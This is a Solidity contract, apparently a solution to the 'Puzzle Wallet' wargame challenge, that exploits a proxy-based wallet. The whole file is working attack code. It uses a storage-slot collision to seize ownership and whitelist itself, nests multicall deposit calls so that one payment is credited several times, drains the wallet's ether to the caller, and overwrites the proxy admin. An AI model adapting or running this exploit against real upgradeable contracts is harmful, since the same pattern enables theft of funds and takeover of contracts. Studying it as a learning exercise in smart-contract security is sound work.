// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract HackPuzzleWallet {

    /*
        VALUE GETTERS
    */
    function getPuzzleWalletBalance (address _puzzleWalletProxyAddr) external view returns (uint256){
        return (_puzzleWalletProxyAddr.balance);
    }

    function isWhitelisted (address _puzzleWalletProxyAddr) external view returns (bool){
        PuzzleWallet wallet = PuzzleWallet(payable(_puzzleWalletProxyAddr));
        return (wallet.whitelisted(address(this)));
    }

    function getDeposit (address _puzzleWalletProxyAddr) external view returns (uint256) {
        PuzzleWallet wallet = PuzzleWallet(payable(_puzzleWalletProxyAddr));
        return (wallet.balances(address(this)));
    }

    function getDepositNeededForHack (address _puzzleWalletProxyAddr, uint256 _fractionOfBalanceToSend) external view returns (uint256) {
        return (_puzzleWalletProxyAddr.balance / _fractionOfBalanceToSend);
    }

    /*
        FOR HACKING
    */
    function hack(address _puzzleWalletProxyAddr, uint256 _fractionOfBalanceToSend) external payable {

        // Init
        PuzzleProxy proxy = PuzzleProxy(payable(_puzzleWalletProxyAddr));
        PuzzleWallet wallet = PuzzleWallet(payable(_puzzleWalletProxyAddr));

        // 1. Make this contract the wallet owner
        proxy.proposeNewAdmin(address(this));

        // 2. Whitelist this contract in wallet
        wallet.addToWhitelist(address(this));        

        // 3. False deposit against this contract's address
        bytes[] memory dataToSendStage2Individual = new bytes[](1);
        dataToSendStage2Individual[0] = abi.encodeWithSignature("deposit()");

        bytes memory dataToSendStage1Individual = abi.encodeWithSignature(
            "multicall(bytes[])",
            dataToSendStage2Individual
        );

        uint256 balanceToDeposit = _puzzleWalletProxyAddr.balance / _fractionOfBalanceToSend;
        require(msg.value == balanceToDeposit, "NEEDS CORRECT VALUE");

        bytes[] memory dataToSend = new bytes[](_fractionOfBalanceToSend + 1);
        for(uint256 i = 0; i < (_fractionOfBalanceToSend + 1); i++){
            dataToSend[i] = dataToSendStage1Individual;
        }
        wallet.multicall{value: balanceToDeposit}(dataToSend);

        // 4. Drain out Puzzle Wallet
        wallet.execute(
            msg.sender,
            balanceToDeposit * (_fractionOfBalanceToSend + 1),
            ""
        );

        // 5. Make caller as Proxy admin
        wallet.setMaxBalance(uint256(msg.sender));
    }
}